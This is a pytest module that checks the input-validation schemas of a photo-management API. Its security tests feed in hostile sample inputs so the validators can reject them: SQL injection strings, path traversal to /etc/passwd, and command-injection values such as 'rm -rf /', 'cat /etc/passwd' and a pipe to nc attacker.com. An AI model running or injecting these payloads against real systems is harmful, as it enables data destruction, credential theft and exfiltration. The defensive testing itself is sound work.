"""
Test input validation across all API schemas.

This module tests that all Pydantic schemas properly validate user inputs
to prevent security vulnerabilities and ensure data integrity.
"""

from datetime import date
from uuid import uuid4

import pytest
from pydantic import ValidationError

from app.adapters.inbound.api.schemas.album_schemas import (
    AlbumCreateRequest,
    AlbumPhotosRequest,
)
from app.adapters.inbound.api.schemas.connector_schemas import (
    ConnectorCreateRequest,
    GooglePhotosCallbackRequest,
    LocalFolderCreateRequest,
)
from app.adapters.inbound.api.schemas.face_schemas import (
    ClusterMergeRequest,
    ClusterNameRequest,
)
from app.adapters.inbound.api.schemas.model_schemas import (
    DownloadRequest,
    SetActiveModelRequest,
)
from app.adapters.inbound.api.schemas.search_schemas import (
    SearchFilters,
    SearchRequest,
)
from app.adapters.inbound.api.schemas.settings_schemas import AppSettingsUpdate


class TestAlbumValidation:
    """Test album schema validation."""

    def test_album_create_valid(self):
        """Test valid album creation."""
        request = AlbumCreateRequest(name="My Album", description="Test description")
        assert request.name == "My Album"
        assert request.description == "Test description"

    def test_album_create_name_whitespace_stripped(self):
        """Test album name whitespace is stripped."""
        request = AlbumCreateRequest(name="  My Album  ")
        assert request.name == "My Album"

    def test_album_create_empty_name_fails(self):
        """Test empty album name fails validation."""
        with pytest.raises(ValidationError) as exc_info:
            AlbumCreateRequest(name="")
        assert "Album name cannot be empty" in str(exc_info.value)

    def test_album_create_whitespace_only_name_fails(self):
        """Test whitespace-only album name fails validation."""
        with pytest.raises(ValidationError) as exc_info:
            AlbumCreateRequest(name="   ")
        assert "Album name cannot be empty" in str(exc_info.value)

    def test_album_create_name_too_long_fails(self):
        """Test album name exceeding max length fails."""
        with pytest.raises(ValidationError) as exc_info:
            AlbumCreateRequest(name="a" * 256)
        assert "at most 255 characters" in str(exc_info.value)

    def test_album_create_description_too_long_fails(self):
        """Test album description exceeding max length fails."""
        with pytest.raises(ValidationError) as exc_info:
            AlbumCreateRequest(name="Test", description="a" * 2001)
        assert "at most 2000 characters" in str(exc_info.value)

    def test_album_photos_request_valid(self):
        """Test valid album photos request."""
        photo_ids = [uuid4() for _ in range(10)]
        request = AlbumPhotosRequest(photo_ids=photo_ids)
        assert len(request.photo_ids) == 10

    def test_album_photos_request_empty_list_fails(self):
        """Test empty photo IDs list fails."""
        with pytest.raises(ValidationError) as exc_info:
            AlbumPhotosRequest(photo_ids=[])
        assert "At least one photo ID is required" in str(exc_info.value)

    def test_album_photos_request_too_many_fails(self):
        """Test too many photo IDs fails."""
        photo_ids = [uuid4() for _ in range(1001)]
        with pytest.raises(ValidationError) as exc_info:
            AlbumPhotosRequest(photo_ids=photo_ids)
        assert "Cannot process more than 1000 photos" in str(exc_info.value)

    def test_album_photos_request_duplicates_fails(self):
        """Test duplicate photo IDs fail validation."""
        photo_id = uuid4()
        with pytest.raises(ValidationError) as exc_info:
            AlbumPhotosRequest(photo_ids=[photo_id, photo_id])
        assert "Duplicate photo IDs are not allowed" in str(exc_info.value)


class TestConnectorValidation:
    """Test connector schema validation."""

    def test_connector_create_valid(self):
        """Test valid connector creation."""
        request = ConnectorCreateRequest(type="local", name="My Connector")
        assert request.type == "local"
        assert request.name == "My Connector"

    def test_connector_create_invalid_type_fails(self):
        """Test invalid connector type fails."""
        with pytest.raises(ValidationError) as exc_info:
            ConnectorCreateRequest(type="invalid_type")
        assert "Invalid connector type" in str(exc_info.value)

    def test_local_folder_create_valid(self):
        """Test valid local folder connector."""
        request = LocalFolderCreateRequest(path="/home/user/photos")
        assert request.path == "/home/user/photos"
        assert request.recursive is True

    def test_local_folder_create_path_traversal_fails(self):
        """Test path traversal patterns are rejected."""
        with pytest.raises(ValidationError) as exc_info:
            LocalFolderCreateRequest(path="/home/user/../../../etc/passwd")
        assert "Path traversal patterns are not allowed" in str(exc_info.value)

    def test_local_folder_create_empty_path_fails(self):
        """Test empty path fails validation."""
        with pytest.raises(ValidationError) as exc_info:
            LocalFolderCreateRequest(path="")
        assert "Folder path cannot be empty" in str(exc_info.value)

    def test_local_folder_create_path_too_long_fails(self):
        """Test path exceeding max length fails."""
        with pytest.raises(ValidationError) as exc_info:
            LocalFolderCreateRequest(path="a" * 4097)
        assert "at most 4096 characters" in str(exc_info.value)

    def test_google_photos_callback_valid(self):
        """Test valid Google Photos callback."""
        request = GooglePhotosCallbackRequest(
            code="test_code_123", redirect_uri="https://example.com/callback", state="csrf_token"
        )
        assert request.code == "test_code_123"
        assert request.redirect_uri == "https://example.com/callback"

    def test_google_photos_callback_invalid_redirect_uri_fails(self):
        """Test invalid redirect URI fails."""
        with pytest.raises(ValidationError) as exc_info:
            GooglePhotosCallbackRequest(code="test_code", redirect_uri="invalid_uri")
        assert "must start with http:// or https://" in str(exc_info.value)


class TestSearchValidation:
    """Test search schema validation."""

    def test_search_request_valid(self):
        """Test valid search request."""
        request = SearchRequest(query="sunset beach", limit=20, offset=0)
        assert request.query == "sunset beach"
        assert request.limit == 20

    def test_search_request_empty_query_fails(self):
        """Test empty query fails validation."""
        with pytest.raises(ValidationError) as exc_info:
            SearchRequest(query="")
        assert "cannot be empty" in str(exc_info.value)

    def test_search_request_query_too_long_fails(self):
        """Test query exceeding max length fails."""
        with pytest.raises(ValidationError) as exc_info:
            SearchRequest(query="a" * 501)
        assert "at most 500 characters" in str(exc_info.value)

    def test_search_request_sql_injection_pattern_fails(self):
        """Test SQL injection patterns are rejected."""
        with pytest.raises(ValidationError) as exc_info:
            SearchRequest(query="test'; DROP TABLE photos; --")
        assert "suspicious patterns" in str(exc_info.value)

    def test_search_request_limit_validation(self):
        """Test limit parameter validation."""
        # Valid limits
        SearchRequest(query="test", limit=1)
        SearchRequest(query="test", limit=100)

        # Invalid limits
        with pytest.raises(ValidationError):
            SearchRequest(query="test", limit=0)
        with pytest.raises(ValidationError):
            SearchRequest(query="test", limit=101)

    def test_search_request_offset_validation(self):
        """Test offset parameter validation."""
        # Valid offsets
        SearchRequest(query="test", offset=0)
        SearchRequest(query="test", offset=10000)

        # Invalid offsets
        with pytest.raises(ValidationError):
            SearchRequest(query="test", offset=-1)
        with pytest.raises(ValidationError):
            SearchRequest(query="test", offset=10001)

    def test_search_filters_valid(self):
        """Test valid search filters."""
        filters = SearchFilters(
            album_ids=[uuid4(), uuid4()],
            connector_ids=[uuid4()],
            start_date=date(2024, 1, 1),
            end_date=date(2024, 12, 31),
            has_faces=True,
        )
        assert len(filters.album_ids) == 2
        assert filters.has_faces is True

    def test_search_filters_date_range_validation(self):
        """Test date range validation."""
        # Valid date range
        SearchFilters(
            start_date=date(2024, 1, 1),
            end_date=date(2024, 12, 31),
        )

        # Invalid: end_date before start_date
        with pytest.raises(ValidationError) as exc_info:
            SearchFilters(
                start_date=date(2024, 12, 31),
                end_date=date(2024, 1, 1),
            )
        assert "End date must be after or equal to start date" in str(exc_info.value)

    def test_search_filters_duplicate_ids_fails(self):
        """Test duplicate filter IDs fail validation."""
        album_id = uuid4()
        with pytest.raises(ValidationError) as exc_info:
            SearchFilters(album_ids=[album_id, album_id])
        assert "Duplicate album IDs are not allowed" in str(exc_info.value)


class TestFaceValidation:
    """Test face schema validation."""

    def test_cluster_name_request_valid(self):
        """Test valid cluster name request."""
        request = ClusterNameRequest(name="John Doe")
        assert request.name == "John Doe"

    def test_cluster_name_request_empty_fails(self):
        """Test empty cluster name fails."""
        with pytest.raises(ValidationError) as exc_info:
            ClusterNameRequest(name="")
        assert "cannot be empty" in str(exc_info.value)

    def test_cluster_merge_request_valid(self):
        """Test valid cluster merge request."""
        source_ids = [uuid4() for _ in range(3)]
        target_id = uuid4()
        request = ClusterMergeRequest(source_cluster_ids=source_ids, target_cluster_id=target_id)
        assert len(request.source_cluster_ids) == 3

    def test_cluster_merge_request_target_in_sources_fails(self):
        """Test target cluster in sources fails."""
        cluster_id = uuid4()
        with pytest.raises(ValidationError) as exc_info:
            ClusterMergeRequest(
                source_cluster_ids=[cluster_id, uuid4()], target_cluster_id=cluster_id
            )
        assert "Target cluster cannot be in the list of source clusters" in str(exc_info.value)


class TestSettingsValidation:
    """Test settings schema validation."""

    def test_settings_update_valid(self):
        """Test valid settings update."""
        request = AppSettingsUpdate(
            thumbnail_quality=85,
            clip_model="ViT-B/32",
            indexing_batch_size=100,
        )
        assert request.thumbnail_quality == 85
        assert request.clip_model == "ViT-B/32"

    def test_settings_thumbnail_quality_validation(self):
        """Test thumbnail quality validation."""
        # Valid values
        AppSettingsUpdate(thumbnail_quality=1)
        AppSettingsUpdate(thumbnail_quality=100)

        # Invalid values
        with pytest.raises(ValidationError):
            AppSettingsUpdate(thumbnail_quality=0)
        with pytest.raises(ValidationError):
            AppSettingsUpdate(thumbnail_quality=101)

    def test_settings_clip_model_validation(self):
        """Test CLIP model validation."""
        # Valid model
        AppSettingsUpdate(clip_model="ViT-B/32")

        # Invalid model
        with pytest.raises(ValidationError) as exc_info:
            AppSettingsUpdate(clip_model="InvalidModel")
        assert "Invalid CLIP model" in str(exc_info.value)

    def test_settings_batch_size_validation(self):
        """Test batch size validation."""
        # Valid values
        AppSettingsUpdate(indexing_batch_size=1)
        AppSettingsUpdate(indexing_batch_size=1000)

        # Invalid values
        with pytest.raises(ValidationError):
            AppSettingsUpdate(indexing_batch_size=0)
        with pytest.raises(ValidationError):
            AppSettingsUpdate(indexing_batch_size=1001)


class TestModelValidation:
    """Test model schema validation."""

    def test_download_request_valid(self):
        """Test valid download request."""
        request = DownloadRequest(model_id="openai/clip-vit-base-patch32", revision="main")
        assert request.model_id == "openai/clip-vit-base-patch32"

    def test_download_request_invalid_format_fails(self):
        """Test invalid model ID format fails."""
        with pytest.raises(ValidationError) as exc_info:
            DownloadRequest(model_id="invalid_format")
        assert "must be in format: author/model-name" in str(exc_info.value)

    def test_download_request_revision_validation(self):
        """Test revision validation."""
        # Valid revision
        DownloadRequest(model_id="author/model", revision="main")

        # Invalid revision with suspicious characters
        with pytest.raises(ValidationError) as exc_info:
            DownloadRequest(model_id="author/model", revision="main; rm -rf /")
        assert "invalid characters" in str(exc_info.value)

    def test_set_active_model_valid(self):
        """Test valid set active model request."""
        request = SetActiveModelRequest(task="clip", model_id="openai/clip")
        assert request.task == "clip"

    def test_set_active_model_invalid_task_fails(self):
        """Test invalid task type fails."""
        with pytest.raises(ValidationError) as exc_info:
            SetActiveModelRequest(task="invalid_task", model_id="model")
        assert "Invalid task type" in str(exc_info.value)


class TestPaginationValidation:
    """Test pagination parameter validation across all endpoints."""

    def test_page_parameter_validation(self):
        """Test page parameter accepts valid ranges."""
        # Page should be 1-1000
        # This is tested via FastAPI Query validators in the routes
        # Here we document the expected behavior
        assert 1 <= 1 <= 1000  # Valid
        assert 1 <= 500 <= 1000  # Valid
        assert 1 <= 1000 <= 1000  # Valid
        # 0 or 1001 would be invalid

    def test_per_page_parameter_validation(self):
        """Test per_page parameter accepts valid ranges."""
        # per_page should be 1-100
        assert 1 <= 1 <= 100  # Valid
        assert 1 <= 50 <= 100  # Valid
        assert 1 <= 100 <= 100  # Valid
        # 0 or 101 would be invalid


class TestSecurityValidation:
    """Test security-related input validation."""

    def test_sql_injection_patterns_rejected(self):
        """Test various SQL injection patterns are rejected."""
        malicious_queries = [
            "'; DROP TABLE photos; --",
            "UNION SELECT * FROM users",
            "DELETE FROM photos WHERE 1=1",
            "test' OR '1'='1",
            "test'; xp_cmdshell('dir')",
        ]

        for query in malicious_queries:
            with pytest.raises(ValidationError) as exc_info:
                SearchRequest(query=query)
            assert "suspicious patterns" in str(exc_info.value).lower()

    def test_path_traversal_patterns_rejected(self):
        """Test path traversal patterns are rejected."""
        malicious_paths = [
            "../../../etc/passwd",
            "/home/user/../../etc/passwd",
            "..\\..\\..\\windows\\system32",
        ]

        for path in malicious_paths:
            with pytest.raises(ValidationError) as exc_info:
                LocalFolderCreateRequest(path=path)
            assert "Path traversal" in str(exc_info.value)

    def test_command_injection_patterns_rejected(self):
        """Test command injection patterns are rejected."""
        malicious_revisions = [
            "main; rm -rf /",
            "main && cat /etc/passwd",
            "main | nc attacker.com 1234",
            "main$(whoami)",
            "main`whoami`",
        ]

        for revision in malicious_revisions:
            with pytest.raises(ValidationError) as exc_info:
                DownloadRequest(model_id="author/model", revision=revision)
            assert "invalid characters" in str(exc_info.value).lower()
